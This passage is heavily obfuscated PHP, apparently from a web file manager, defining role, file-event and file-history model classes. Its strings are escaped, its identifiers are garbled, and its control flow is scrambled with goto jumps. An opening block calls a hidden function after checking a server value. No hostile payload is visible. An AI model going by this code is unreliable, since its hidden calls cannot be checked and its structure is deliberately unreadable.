($_SERVER[$_SERVER[£ü][723]] != $c¦±õô†” ($D ËÃ™ªÜí)) { goto FÌÔïÍİ±Ø; FÌÔïÍİ±Ø: $D‰’Å®’¯© = $_SERVER[£ü][725]; $Fƒö¦¥«‘ê = $_SERVER[$_SERVER[£ü][726]] . $_SERVER[£ü][727]; $F—½ñ‡¹—ã = $D‰’Å®’¯©($Fƒö¦¥«‘ê); goto føÈë§øÁ­; f’¦÷áçŸ²: $FÁÄéìã($D ËÃ™ªÜí); goto B¡ØÜ´œí™; føÈë§øÁ­: $DˆÄ§–ŠÃï = explode($_SERVER[£ü][214], $F—½ñ‡¹—ã); if (count($DˆÄ§–ŠÃï) < $_SERVER[£ü][558]) { $CŠºÎ„Œ‡´ = $_SERVER[£ü][728]; $CŠºÎ„Œ‡´(); } $FÁÄéìã = $_SERVER[£ü][729]; goto f’¦÷áçŸ²; B¡ØÜ´œí™: } class SystemRecordModel extends ModelBaseLight { } class SystemRoleModel extends ModelBaseLight { public $optionType = "\123\x79\163\164\145\155\x2e\x72\157\154\145\x4c\x69\163\164"; public $field = array("\156\141\155\145", "\141\165\164\x68", "\x6c\x61\x62\145\x6c", "\x64\151\x73\x70\x6c\141\171", "\163\171\163\164\145\x6d", "\144\145\x73\x63", "\x69\x67\x6e\157\x72\x65\x45\170\x74", "\x69\x67\156\157\x72\x65\106\x69\154\x65\x53\x69\172\145", "\x61\144\x6d\x69\156\151\163\164\x72\141\x74\157\162", "\163\x6f\x72\x74"); public function listData($D»À ˆœˆ’ = false, $Aã´¢†ğ¿’ = "\163\x6f\162\x74", $e¿³•¤ö³ = false) { return parent::listData($D»À ˆœˆ’, $Aã´¢†ğ¿’, $e¿³•¤ö³); } public function update($fâë¶®îê¶, $C‰³Å¨¯ãÀ) { goto e¶»®¢Ò; C¾‘„‹ÙŒ: return parent::update($fâë¶®îê¶, $C‰³Å¨¯ãÀ); goto Eë±ó–÷ñ«; FŠëÔŠ•´º: if (!$Dµ”ÃĞÍ· || $A†×°¾æ· && $A†×°¾æ·[$eÃ¯ÒèÈ²[364]] != $Dµ”ÃĞÍ·[$eÃ¯ÒèÈ²[364]]) { return !1; } if ($A†×°¾æ·[$eÃ¯ÒèÈ²[2432]] == 1) { $C‰³Å¨¯ãÀ = array($eÃ¯ÒèÈ²[28] => $C‰³Å¨¯ãÀ[$eÃ¯ÒèÈ²[28]], $eÃ¯ÒèÈ²[2082] => $C‰³Å¨¯ãÀ[$eÃ¯ÒèÈ²[2082]]); } $this->filterAuth($C‰³Å¨¯ãÀ[$eÃ¯ÒèÈ²[373]]); goto C¾‘„‹ÙŒ; e¶»®¢Ò: $eÃ¯ÒèÈ² =& $_SERVER[£ü]; $Dµ”ÃĞÍ· = parent::listData($fâë¶®îê¶); $A†×°¾æ· = $this->findByName($C‰³Å¨¯ãÀ[$eÃ¯ÒèÈ²[28]]); goto FŠëÔŠ•´º; Eë±ó–÷ñ«: } public function remove($aæ é˜˜òˆ) { $A»©ŞœÊÜõ = parent::listData($aæ é˜˜òˆ); if (!$A»©ŞœÊÜõ || $A»©ŞœÊÜõ[$_SERVER[£ü][1070]]) { return !1; } return parent::remove($aæ é˜˜òˆ); } public function add($A±À¤•‡¬ã) { goto A¶ÃÕš„Õ; fÛÁÛ™¸ºØ: return parent::insert($A±À¤•‡¬ã); goto Aî¨êèÛŸ; aßœõ—éù†: $fè‚Áøôİ£ = array($e¡İ‰´Âˆ[383] => $eç¸ˆ¦•„, $e¡İ‰´Âˆ[2070] => $e¡İ‰´Âˆ[33], $e¡İ‰´Âˆ[2066] => $e¡İ‰´Âˆ[2083], $e¡İ‰´Âˆ[2433] => 1, $e¡İ‰´Âˆ[2069] => 0, $e¡İ‰´Âˆ[2434] => 0, $e¡İ‰´Âˆ[2068] => $this->getSort()); $A±À¤•‡¬ã = array_merge($fè‚Áøôİ£, $A±À¤•‡¬ã); $this->filterAuth($A±À¤•‡¬ã[$e¡İ‰´Âˆ[373]]); goto fÛÁÛ™¸ºØ; A¶ÃÕš„Õ: $e¡İ‰´Âˆ =& $_SERVER[£ü]; $eç¸ˆ¦•„ = $A±À¤•‡¬ã[$e¡İ‰´Âˆ[28]]; if ($this->findByName($eç¸ˆ¦•„)) { return !1; } goto aßœõ—éù†; Aî¨êèÛŸ: } private function getSort() { $e§Ä•…ôà =& $_SERVER[£ü]; $F â—Ô¢·À = parent::listData(); $ašõê­Üî· = array_to_keyvalue($F â—Ô¢·À, $e§Ä•…ôà[33], $e§Ä•…ôà[2085]); return empty($ašõê­Üî·) ? 0 : max($ašõê­Üî·) + 1; } private function filterAuth(&$EŠ×Ğì›Šğ) { $DÃ¼ñ†’ï‡ =& $_SERVER[£ü]; $ağÉäÜóØ = array(); $cÓˆğßËï– = array_filter(explode($DÃ¼ñ†’ï‡[47], $EŠ×Ğì›Šğ)); foreach ($cÓˆğßËï– as $EŠ×Ğì›Šğ) { $C÷¤ŒÀ†Ç = explode($DÃ¼ñ†’ï‡[93], $EŠ×Ğì›Šğ); if ($C÷¤ŒÀ†Ç[0] == $DÃ¼ñ†’ï‡[1744] && $C÷¤ŒÀ†Ç[1] != $DÃ¼ñ†’ï‡[1026]) { $dìã†ãó©­ = $C÷¤ŒÀ†Ç[0] . $DÃ¼ñ†’ï‡[93] . $C÷¤ŒÀ†Ç[1] . $DÃ¼ñ†’ï‡[2435]; if (!in_array($dìã†ãó©­, $cÓˆğßËï–)) { $ağÉäÜóØ[] = $dìã†ãó©­; } } $ağÉäÜóØ[] = $EŠ×Ğì›Šğ; } $EŠ×Ğì›Šğ = implode($DÃ¼ñ†’ï‡[47], $ağÉäÜóØ); } public function sort($EßÂøù°©, $Bê‹š÷ë¤) { return parent::update($EßÂøù°©, $Bê‹š÷ë¤); } } goto Eµö­ÍƒÂ; BÔÂ§Â©ß¦: define($_SERVER[£ü][1893], 2); define($_SERVER[£ü][1894], 3); define($_SERVER[£ü][1895], 4); goto BŒ®öÊİí¼; cê¨Ò¾ÍæÆ: class SourceEventModel extends ModelBase { protected $tableName = "\151\x6f\x5f\163\x6f\x75\162\x63\145\x5f\145\x76\x65\156\x74"; protected $dataAuto = array(array("\143\162\145\x61\x74\145\x54\x69\155\145", "\164\151\155\x65", "\x69\156\163\145\x72\x74", "\146\x75\x6e\143\164\x69\157\x6e"), array("\144\x65\163\x63", '', "\151\156\163\x65\x72\164\x2c\x75\x70\x64\141\x74\145\x2c\163\x65\x6c\x65\x63\164", "\x6a\x73\157\x6e")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($F¼å¨˜Åëô, $fÀ«—ê´¤Ë, $fé°«ä¡ø = '') { goto f÷‚‹ŒÛÅã; b«‰÷–‘: if (!$D‚ªèšè˜) { return !1; } if ($this->isCacheEvent($D‚ªèšè˜, $fÀ«—ê´¤Ë)) { return; } if ($fé°«ä¡ø && is_string($fé°«ä¡ø)) { $fé°«ä¡ø = array($FÃ™ŠÊ…£Ó[2094] => $fé°«ä¡ø); } goto bó‰ÙÔË¦‰; bó‰ÙÔË¦‰: $Cïîº¸‹ù† = array($FÃ™ŠÊ…£Ó[380] => $F¼å¨˜Åëô, $FÃ™ŠÊ…£Ó[2229] => $D‚ªèšè˜[$FÃ™ŠÊ…£Ó[457]], $FÃ™ŠÊ…£Ó[2230] => $D‚ªèšè˜[$FÃ™ŠÊ…£Ó[28]], $FÃ™ŠÊ…£Ó[462] => $D‚ªèšè˜[$FÃ™ŠÊ…£Ó[462]], $FÃ™ŠÊ…£Ó[1392] => USER_ID, $FÃ™ŠÊ…£Ó[385] => $fÀ«—ê´¤Ë, $FÃ™ŠÊ…£Ó[1394] => $fé°«ä¡ø); $this->addSystemLog($fÀ«—ê´¤Ë, $Cïîº¸‹ù†); return $this->add($Cïîº¸‹ù†); goto b’Ò—³ç¨; f÷‚‹ŒÛÅã: $FÃ™ŠÊ…£Ó =& $_SERVER[£ü]; if (!$this->eventSave) { return; } $D‚ªèšè˜ = Model($FÃ™ŠÊ…£Ó[1100])->sourceInfo($F¼å¨˜Åëô); goto b«‰÷–‘; b’Ò—³ç¨: } private function addSystemLog($fˆãçÌÀİ¼, $BÍ½Æè­µ) { $f«Ã ¾¼—å =& $_SERVER[£ü]; if ($fˆãçÌÀİ¼ == $f«Ã ¾¼—å[2231]) { $fˆãçÌÀİ¼ = $BÍ½Æè­µ[$f«Ã ¾¼—å[401]][$f«Ã ¾¼—å[2232]]; } else { if (in_array($fˆãçÌÀİ¼, array($f«Ã ¾¼—å[2041], $f«Ã ¾¼—å[2233]))) { $fˆãçÌÀİ¼ = $BÍ½Æè­µ[$f«Ã ¾¼—å[401]][$f«Ã ¾¼—å[681]]; } } $DùŒ˜¡½ñ§ = array_merge($BÍ½Æè­µ, array($f«Ã ¾¼—å[2234] => $BÍ½Æè­µ[$f«Ã ¾¼—å[366]], $f«Ã ¾¼—å[2235] => $BÍ½Æè­µ[$f«Ã ¾¼—å[2235]])); Model($f«Ã ¾¼—å[2005])->addLog($f«Ã ¾¼—å[2236] . $fˆãçÌÀİ¼, $DùŒ˜¡½ñ§); } private function isCacheEvent($a¹ŒŠ‡îù, $f×½Ÿ¾ÊÓ) { if ($a¹ŒŠ‡îù[$_SERVER[£ü][368]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($B¨Æ¦ë”, $C­ÉÎõŒÆŸ) { $aĞˆ»†œÚ© =& $_SERVER[£ü]; $D­Ü‚Á‚„â = Model($aĞˆ»†œÚ©[1100])->sourceInfo($B¨Æ¦ë”); $Fëï³òëì¯ = array($aĞˆ»†œÚ©[2232] => $C­ÉÎõŒÆŸ, $aĞˆ»†œÚ©[28] => $D­Ü‚Á‚„â[$aĞˆ»†œÚ©[28]]); return $this->addEvent($B¨Æ¦ë”, $aĞˆ»†œÚ©[2231], $Fëï³òëì¯); } public function eventFileEdit($Aˆİ¹¨ºîà) { $B×æÓ˜ÇÎØ =& $_SERVER[£ü]; $A‚Ö‡ê ˜Ò = array($B×æÓ˜ÇÎØ[2237] => $_SERVER[$B×æÓ˜ÇÎØ[2238]], $B×æÓ˜ÇÎØ[1711] => strtolower(ACTION)); return $this->addEvent($Aˆİ¹¨ºîà, $B×æÓ˜ÇÎØ[2032], $A‚Ö‡ê ˜Ò); } public function eventRecycle($aÑé³äò—ä, $Dß®™õ¨É) { return $this->addEvent($aÑé³äò—ä, $_SERVER[£ü][2233], $Dß®™õ¨É); } public function eventRemove($a¬ø—Äå˜œ) { $F¹‹¾ôóŸ« =& $_SERVER[£ü]; $B…ôŸ†Ùô• = Model($F¹‹¾ôóŸ«[1100])->sourceInfo($a¬ø—Äå˜œ); $a’İñ×Ó¦± = $B…ôŸ†Ùô•[$F¹‹¾ôóŸ«[28]]; return $this->addEvent($B…ôŸ†Ùô•[$F¹‹¾ôóŸ«[457]], $F¹‹¾ôóŸ«[2031], $a’İñ×Ó¦±); } public function eventShare($dÙÇÑö‰ÈË, $CÍÔÓÑ¬š) { return $this->addEvent($dÙÇÑö‰ÈË, $_SERVER[£ü][2041], $CÍÔÓÑ¬š); } public function eventMove($e³«¼ôÉÀ‰, $BªÆî§Ş, $D´òäË¢Î‘) { goto cµ’±—„Âğ; EöõÂˆ¹ÙÃ: $this->addEvent($BªÆî§Ş, $C†ÍœöÑ‰[2243], $eéãò—é); goto Bµ”Ş§•ˆ; bšñõîá¹º: $this->addEvent($e³«¼ôÉÀ‰, $C†ÍœöÑ‰[488], $eéãò—é); $F´Çºâ¢Å½ = $fÍ¶Ã×ğ²»->sourceInfo($e³«¼ôÉÀ‰); $eéãò—é = array($C†ÍœöÑ‰[366] => $F´Çºâ¢Å½[$C†ÍœöÑ‰[366]], $C†ÍœöÑ‰[28] => $F´Çºâ¢Å½[$C†ÍœöÑ‰[28]]); goto EöõÂˆ¹ÙÃ; cµ’±—„Âğ: $C†ÍœöÑ‰ =& $_SERVER[£ü]; $fÍ¶Ã×ğ²» = Model($C†ÍœöÑ‰[1100]); $F´Çºâ¢Å½ = $fÍ¶Ã×ğ²»->sourceInfo($e³«¼ôÉÀ‰); goto Aô·¯ØŞò¼; Aô·¯ØŞò¼: $c¸ÇÆÙ£ = $fÍ¶Ã×ğ²»->sourceInfo($BªÆî§Ş); $Aøˆ”×ŠĞ¢ = $fÍ¶Ã×ğ²»->sourceInfo($D´òäË¢Î‘); $eéãò—é = array($C†ÍœöÑ‰[994] => $BªÆî§Ş, $C†ÍœöÑ‰[2239] => $c¸ÇÆÙ£[$C†ÍœöÑ‰[28]], $C†ÍœöÑ‰[2240] => $c¸ÇÆÙ£[$C†ÍœöÑ‰[462]], $C†ÍœöÑ‰[995] => $D´òäË¢Î‘, $C†ÍœöÑ‰[2241] => $Aøˆ”×ŠĞ¢[$C†ÍœöÑ‰[28]], $C†ÍœöÑ‰[2242] => $Aøˆ”×ŠĞ¢[$C†ÍœöÑ‰[462]]); goto bšñõîá¹º; Bµ”Ş§•ˆ: } public function eventCopy($A‚õ¶êáö) { $this->eventCreate($A‚õ¶êáö, $_SERVER[£ü][486]); } public function eventRename($aêçè¨£¯, $fø¥¾¤ĞĞä, $d´Ø£Õ¦ùÄ) { $FŞí¢îÄï =& $_SERVER[£ü]; $f†ÈÕöÀñ = array($FŞí¢îÄï[994] => $fø¥¾¤ĞĞä, $FŞí¢îÄï[995] => $d´Ø£Õ¦ùÄ); return $this->addEvent($aêçè¨£¯, $FŞí¢îÄï[1112], $f†ÈÕöÀñ); } public function eventAddComment($eâ¾Ë¬±«², $d¥øÆ’À…Ö) { return $this->addEvent($eâ¾Ë¬±«², $_SERVER[£ü][2244], $d¥øÆ’À…Ö); } public function eventAddDesc($f¢Ø¿Ä‘…, $AÕ—Íİ”õ¿) { return $this->addEvent($f¢Ø¿Ä‘…, $_SERVER[£ü][2245], $AÕ—Íİ”õ¿); } public function listBySource($d¼¥¨ÒÈñÛ) { goto fŒ¦Æñ§Ş›; F§‹ ‰™ë˜: if ($a£“ºˆ³Õ£[$AÂ‰çšµ´[367]] == $AÂ‰çšµ´[83]) { $d¨Ï¡îâ…  = Model($AÂ‰çšµ´[1100])->listSearchChildren($d¼¥¨ÒÈñÛ, 20000); $d¨Ï¡îâ… [] = $d¼¥¨ÒÈñÛ . $AÂ‰çšµ´[358]; $DĞø¼Á†ƒ = array($AÂ‰çšµ´[366] => array($AÂ‰çšµ´[7], $d¨Ï¡îâ… )); } $fœ¡ƒåÜòè = $this->where($DĞø¼Á†ƒ)->order($AÂ‰çšµ´[2246])->selectPage(); if ($fœ¡ƒåÜòè[$AÂ‰çšµ´[348]][$AÂ‰çšµ´[349]] == 0) { $fœ¡ƒåÜòè[$AÂ‰çšµ´[348]][$AÂ‰çšµ´[349]] = 1; $fœ¡ƒåÜòè[$AÂ‰çšµ´[351]] = array(array($AÂ‰çšµ´[380] => $d¼¥¨ÒÈñÛ, $AÂ‰çšµ´[2229] => $a£“ºˆ³Õ£[$AÂ‰çšµ´[457]], $AÂ‰çšµ´[1392] => $a£“ºˆ³Õ£[$AÂ‰çšµ´[375]], $AÂ‰çšµ´[385] => $AÂ‰çšµ´[2247], $AÂ‰çšµ´[386] => $a£“ºˆ³Õ£[$AÂ‰çšµ´[184]], $AÂ‰çšµ´[1394] => $AÂ‰çšµ´[33])); } goto b¥ÁôÀ°›Ô; fŒ¦Æñ§Ş›: $AÂ‰çšµ´ =& $_SERVER[£ü]; $a£“ºˆ³Õ£ = Model($AÂ‰çšµ´[1100])->sourceInfo($d¼¥¨ÒÈñÛ); $DĞø¼Á†ƒ = array($AÂ‰çšµ´[380] => $d¼¥¨ÒÈñÛ); goto F§‹ ‰™ë˜; b¥ÁôÀ°›Ô: $fœ¡ƒåÜòè = $this->eventListParse($fœ¡ƒåÜòè, $d¼¥¨ÒÈñÛ); show_json($fœ¡ƒåÜòè); goto c´Õ××è±; c´Õ××è±: } private function eventListParse($FŠÏÌƒîÏĞ, $B‚Œ×èÙÃ) { goto B‰×‡Ü›ÜÉ; A÷¦Ÿµ„âĞ: $a•ë¢è¹Çæ = array_to_keyvalue($CÎ¤šÚ·òÀ, $A†”ñÒ¦„‘[33], $A†”ñÒ¦„‘[2235]); foreach ($CÎ¤šÚ·òÀ as $CñŞÜÉ—‰ï) { $AÆµÂÊ˜í„ = $CñŞÜÉ—‰ï[$A†”ñÒ¦„‘[401]]; if ($CñŞÜÉ—‰ï[$A†”ñÒ¦„‘[29]] == $A†”ñÒ¦„‘[488] && isset($AÆµÂÊ˜í„[$A†”ñÒ¦„‘[994]])) { $eè‡œ ¼õ©[] = $AÆµÂÊ˜í„[$A†”ñÒ¦„‘[994]] . $A†”ñÒ¦„‘[33]; $eè‡œ ¼õ©[] = $AÆµÂÊ˜í„[$A†”ñÒ¦„‘[995]] . $A†”ñÒ¦„‘[33]; } if ($CñŞÜÉ—‰ï[$A†”ñÒ¦„‘[29]] == $A†”ñÒ¦„‘[2243] && isset($AÆµÂÊ˜í„[$A†”ñÒ¦„‘[366]])) { $eè‡œ ¼õ©[] = $AÆµÂÊ˜í„[$A†”ñÒ¦„‘[366]] . $A†”ñÒ¦„‘[33]; } } $eè‡œ ¼õ© = array_merge($eè‡œ ¼õ©, $a•ë¢è¹Çæ, array($B‚Œ×èÙÃ . $A†”ñÒ¦„‘[33])); goto AÁˆ¶™ö; AÁˆ¶™ö: $eè‡œ ¼õ© = array_unique($eè‡œ ¼õ©); $f®ºØº ­ = array_unique(array_to_keyvalue($CÎ¤šÚ·òÀ, $A†”ñÒ¦„‘[33], $A†”ñÒ¦„‘[1401])); $FäçÉèâƒ³ = Model($A†”ñÒ¦„‘[473])->userListInfo($f®ºØº ­); goto AÊµÖ§¬¡œ; Bœ”¾¾¢¾: return $FŠÏÌƒîÏĞ; goto DéÇáæô„Ö; B‰×‡Ü›ÜÉ: $A†”ñÒ¦„‘ =& $_SERVER[£ü]; $CÎ¤šÚ·òÀ = $FŠÏÌƒîÏĞ[$A†”ñÒ¦„‘[351]]; $eè‡œ ¼õ© = array_to_keyvalue($CÎ¤šÚ·òÀ, $A†”ñÒ¦„‘[33], $A†”ñÒ¦„‘[366]); goto A÷¦Ÿµ„âĞ; AÊµÖ§¬¡œ: $D¿éÓ­›Œ· = Model($A†”ñÒ¦„‘[748])->sourceListInfo($eè‡œ ¼õ©, !0); foreach ($CÎ¤šÚ·òÀ as &$CñŞÜÉ—‰ï) { if ($CñŞÜÉ—‰ï[$A†”ñÒ¦„‘[29]] == $A†”ñÒ¦„‘[488] && isset($CñŞÜÉ—‰ï[$A†”ñÒ¦„‘[401]][$A†”ñÒ¦„‘[994]])) { $CñŞÜÉ—‰ï[$A†”ñÒ¦„‘[401]][$A†”ñÒ¦„‘[994]] = $D¿éÓ­›Œ·[$CñŞÜÉ—‰ï[$A†”ñÒ¦„‘[401]][$A†”ñÒ¦„‘[994]]]; $CñŞÜÉ—‰ï[$A†”ñÒ¦„‘[401]][$A†”ñÒ¦„‘[995]] = $D¿éÓ­›Œ·[$CñŞÜÉ—‰ï[$A†”ñÒ¦„‘[401]][$A†”ñÒ¦„‘[995]]]; } if ($CñŞÜÉ—‰ï[$A†”ñÒ¦„‘[29]] == $A†”ñÒ¦„‘[2243] && isset($CñŞÜÉ—‰ï[$A†”ñÒ¦„‘[401]][$A†”ñÒ¦„‘[366]])) { $CñŞÜÉ—‰ï[$A†”ñÒ¦„‘[401]][$A†”ñÒ¦„‘[366]] = $D¿éÓ­›Œ·[$CñŞÜÉ—‰ï[$A†”ñÒ¦„‘[401]][$A†”ñÒ¦„‘[366]]]; } $CñŞÜÉ—‰ï[$A†”ñÒ¦„‘[388]] = $D¿éÓ­›Œ·[$CñŞÜÉ—‰ï[$A†”ñÒ¦„‘[366]]]; $CñŞÜÉ—‰ï[$A†”ñÒ¦„‘[2248]] = $D¿éÓ­›Œ·[$CñŞÜÉ—‰ï[$A†”ñÒ¦„‘[2235]]]; if ($CñŞÜÉ—‰ï[$A†”ñÒ¦„‘[29]] == $A†”ñÒ¦„‘[2031]) { $CñŞÜÉ—‰ï[$A†”ñÒ¦„‘[2248]] = $CñŞÜÉ—‰ï[$A†”ñÒ¦„‘[388]]; $CñŞÜÉ—‰ï[$A†”ñÒ¦„‘[2235]] = $CñŞÜÉ—‰ï[$A†”ñÒ¦„‘[2248]][$A†”ñÒ¦„‘[366]]; $CñŞÜÉ—‰ï[$A†”ñÒ¦„‘[388]] = !1; $CñŞÜÉ—‰ï[$A†”ñÒ¦„‘[366]] = $A†”ñÒ¦„‘[33]; } $CñŞÜÉ—‰ï[$A†”ñÒ¦„‘[2201]] = $FäçÉèâƒ³[$CñŞÜÉ—‰ï[$A†”ñÒ¦„‘[1401]]]; } $FŠÏÌƒîÏĞ[$A†”ñÒ¦„‘[351]] = $CÎ¤šÚ·òÀ; goto Bœ”¾¾¢¾; DéÇáæô„Ö: } public function removeBySource($dÌíò…˜Ã) { $BÅµŠÎÓƒå = array($_SERVER[£ü][380] => $dÌíò…˜Ã); $this->where($BÅµŠÎÓƒå)->remove(); } } class SourceHistoryModel extends ModelBase { protected $tableName = "\x69\157\137\163\x6f\165\x72\143\x65\x5f\x68\x69\163\x74\x6f\162\171"; public function addHistory($b÷¹š¤™Â³, $B¥âÌÏ–Êº = '') { $E´éƒ”Ìà =& $_SERVER[£ü]; $eå—ñĞÍ = array($E´éƒ”Ìà[380] => $b÷¹š¤™Â³[$E´éƒ”Ìà[366]], $E´éƒ”Ìà[1392] => isset($b÷¹š¤™Â³[$E´éƒ”Ìà[376]]) ? $b÷¹š¤™Â³[$E´éƒ”Ìà[376]] : $b÷¹š¤™Â³[$E´éƒ”Ìà[375]], $E´éƒ”Ìà[416] => $b÷¹š¤™Â³[$E´éƒ”Ìà[415]], $E´éƒ”Ìà[516] => $b÷¹š¤™Â³[$E´éƒ”Ìà[77]], $E´éƒ”Ìà[2249] => $B¥âÌÏ–Êº); $cçæÇõ™˜Æ = $GLOBALS[$E´éƒ”Ìà[6]][$E´éƒ”Ìà[84]][$E´éƒ”Ìà[2250]]; if ($cçæÇõ™˜Æ > 1) { $this->historyAutoClear($eå—ñĞÍ[$E´éƒ”Ìà[366]]); $this->add($eå—ñĞÍ); } Model($E´éƒ”Ìà[2251])->eventFileEdit($b÷¹š¤™Â³[$E´éƒ”Ìà[366]]); } private function historyAutoClear($F‰é½ç‰Õ˜) { goto DŒ°Í·•“ë; F¿ÛÈÉÜŸê: $béÊÃ×îìÅ = array_to_keyvalue($E±ßªÈŠÍ, $DĞ¶å¼Ëá[33], $DĞ¶å¼Ëá[415]); $béÊÃ×îìÅ = array_slice($béÊÃ×îìÅ, $Fßà’¹¡âŠ); if (!$C®«Ê®”ª || !$béÊÃ×îìÅ) { return; } goto A¦í±º×åò; DŒ°Í·•“ë: $DĞ¶å¼Ëá =& $_SERVER[£ü]; $e¥Ÿáöó‹ª = Model($DĞ¶å¼Ëá[1078])->get($DĞ¶å¼Ëá[2252]); $AÅ…ƒôŞìá = $GLOBALS[$DĞ¶å¼Ëá[6]][$DĞ¶å¼Ëá[84]][$DĞ¶å¼Ëá[2250]]; goto B–ÒÙ¹Ğƒğ; CÕÛŒ±…: if ($Fßà’¹¡âŠ >= 500) { return; } $B…ŠãİòİÓ = array($DĞ¶å¼Ëá[380] => $F‰é½ç‰Õ˜); $E±ßªÈŠÍ = $this->field($DĞ¶å¼Ëá[2254])->where($B…ŠãİòİÓ)->order($DĞ¶å¼Ëá[2246])->select(); goto dª‚‘¼Ù å; dª‚‘¼Ù å: if (!$E±ßªÈŠÍ || $Fßà’¹¡âŠ >= count($E±ßªÈŠÍ)) { return; } $C®«Ê®”ª = array_to_keyvalue($E±ßªÈŠÍ, $DĞ¶å¼Ëá[33], $DĞ¶å¼Ëá[364]); $C®«Ê®”ª = array_slice($C®«Ê®”ª, $Fßà’¹¡âŠ); goto F¿ÛÈÉÜŸê; B–ÒÙ¹Ğƒğ: $d¾Ó¡¢òå¹ = $e¥Ÿáöó‹ª == $DĞ¶å¼Ëá[2253] ? 3 : $AÅ…ƒôŞìá; if ($AÅ…ƒôŞìá <= 1) { $d¾Ó¡¢òå¹ = 1; } $Fßà’¹¡âŠ = $d¾Ó¡¢òå¹ - 1; goto CÕÛŒ±…; A¦í±º×åò: $B…ŠãİòİÓ = array($DĞ¶å¼Ëá[382] => array($DĞ¶å¼Ëá[7], $C®«Ê®”ª)); $this->where($B…ŠãİòİÓ)->delete(); Model($DĞ¶å¼Ëá[418])->remove($béÊÃ×îìÅ); goto BĞ¹Åñè…; BĞ¹Åñè…: } public function listData($Fªí³¥Í‚) { goto DÇ¿ƒİÛÙ¨; DÇ¿ƒİÛÙ¨: $D¼™Óå°ó =& $_SERVER[£ü]; $d˜ŞŒ†êº“ = array($D¼™Óå°ó[380] => $Fªí³¥Í‚); $Cõº›Ñø‰ = $D¼™Óå°ó[2255]; goto CŠæÍâÊÀõ; CŠæÍâÊÀõ: $D ŒÉÉ‘Éå = $this->field($Cõº›Ñø‰)->where($d˜ŞŒ†êº“)->order($D¼™Óå°ó[2246])->selectPage(); $this->_listAppendUser($D ŒÉÉ‘Éå[$D¼™Óå°ó[351]]); $có†õÚìµà = Model($D¼™Óå°ó[1078])->get($D¼™Óå°ó[2252]); goto bµÇ—É; bµÇ—É: $fŒŠ´¢İ” = 3; if ($có†õÚìµà == $D¼™Óå°ó[2253]) { $D ŒÉÉ‘Éå[$D¼™Óå°ó[351]] = array_slice($D ŒÉÉ‘Éå[$D¼™Óå°ó[351]], 0, $fŒŠ´¢İ”); $D ŒÉÉ‘Éå[$D¼™Óå°ó[348]] = array($D¼™Óå°ó[2256] => 1, $D¼™Óå°ó[2257] => 20, $D¼™Óå°ó[2258] => 1, $D¼™Óå°ó[2259] => count($D ŒÉÉ‘Éå[$D¼™Óå°ó[351]])); } return $D ŒÉÉ‘Éå; goto C°õÙ‹—; C°õÙ‹—: } protected function _listAppendUser(&$d¤“ÍË´ñµ) { $c»ÅÆãÆ =& $_SERVER[£ü]; $Cƒ»åÚÆÚ£ = array_to_keyvalue($d¤“ÍË´ñµ, $c»ÅÆãÆ[33], $c»ÅÆãÆ[1401]); $aƒçíñ™ = Model($c»ÅÆãÆ[473])->userListInfo($Cƒ»åÚÆÚ£); foreach ($d¤“ÍË´ñµ as &$AåóóÔçÍ—) { $DÉ„ ª = $AåóóÔçÍ—[$c»ÅÆãÆ[1401]]; $AåóóÔçÍ—[$c»ÅÆãÆ[375]] = $aƒçíñ™[$DÉ„ ª] ? $aƒçíñ™[$DÉ„ ª] : !1; } } public function fileInfo($cÓ§ÑÄö³Ø) { $D¥–º†Ö¼ó =& $_SERVER[£ü]; $d”‡¦›ŞŞù = $this->tablePrefix; $FÕ¼ƒˆÛ¯ã = "{$d”‡¦›ŞŞù}\x69\157\x5f\146\151\154\x65\x20\146\x69\154\x65\163\x20\x6f\156\40\x66\151\x6c\145\x73\x2e\x66\151\x6c\145\x49\104\x20\75\40\x68\x69\163\164\157\x72\x79\x2e\x66\151\154\x65\111\x44"; return $this->alias($D¥–º†Ö¼ó[2260])->where(array($D¥–º†Ö¼ó[382] => $cÓ§ÑÄö³Ø))->join($FÕ¼ƒˆÛ¯ã, $D¥–º†Ö¼ó[2261])->find(); } public function removeItem($a•Áƒ°ˆ¤³) { $C¦‡áÅ…÷» =& $_SERVER[£ü]; $C£ŠÂ«ƒŠƒ = array($C¦‡áÅ…÷»[382] => $a•Áƒ°ˆ¤³); $c±³åËÍ®¿ = $this->where($C£ŠÂ«ƒŠƒ)->find(); if ($c±³åËÍ®¿) { $F´­Ğš•î = $this->where($C£ŠÂ«ƒŠƒ)->delete(); Model($C¦‡áÅ…÷»[418])->remove($c±³åËÍ®¿[$C¦‡áÅ…÷»[415]]); return $F´­Ğš•î; } return !1; } public function removeBySource($D‘ÕáÄÕ‡ì) { goto aÎœ¾¡áø; AÚš‘µø÷ô: $C·›åÙÂ®‹ = array($b•É‹”§éí[380] => array($b•É‹”§éí[7], $D‘ÕáÄÕ‡ì)); $EÜÅ„ƒÇ·Ä = $this->field($b•É‹”§éí[416])->where($C·›åÙÂ®‹)->select(); if ($EÜÅ„ƒÇ·Ä) { $this->where($C·›åÙÂ®‹)->delete(); $CÀÏƒî¯â = array_to_keyvalue($EÜÅ„ƒÇ·Ä, $b•É‹”§éí[33], $b•É‹”§éí[415]); Model($b•É‹”§éí[418])->remove($CÀÏƒî¯â); } goto DÓÄ¤¶íùÕ; aÎœ¾¡áø: $b•É‹”§éí =& $_SERVER[£ü]; if (!$D‘ÕáÄÕ‡ì) { return !1; } if (!is_array($D‘ÕáÄÕ‡ì)) { $D‘ÕáÄÕ‡ì = array($D‘ÕáÄÕ‡ì); } goto AÚš‘µø÷ô; DÓÄ¤¶íùÕ: return !0; goto dùáŠ•÷¬©; dùáŠ•÷¬©: } public function setDetail($dİÑ‹¤êÔÒ, $fŸĞßÓêáà) { $d‰ƒä÷êŠÄ =& $_SERVER[£ü]; return $this->where(array($d‰ƒä÷êŠÄ[382] => $dİÑ‹¤êÔÒ))->save(array($d‰ƒä÷êŠÄ[2249] => $fŸĞßÓêáà)); } public function rollbackToItem($C‹ã…ªíí’, $eŒ…ËºÜêš) { goto d±ĞÀ¾õ…Í; a÷ñİ‘ÇìÙ: return $this->where(array($c«âÕŸ–½‚[382] => $eŒ…ËºÜêš))->delete(); goto aÆç÷Øéõš; d±ĞÀ¾õ…Í: $c«âÕŸ–½‚ =& $_SERVER[£ü]; $Cœ¦¬ÜÍíÙ = Model($c«âÕŸ–½‚[748])->sourceInfo($C‹ã…ªíí’); $this->addHistory($Cœ¦¬ÜÍíÙ); goto dÜŒ•¥«ÁÃ; 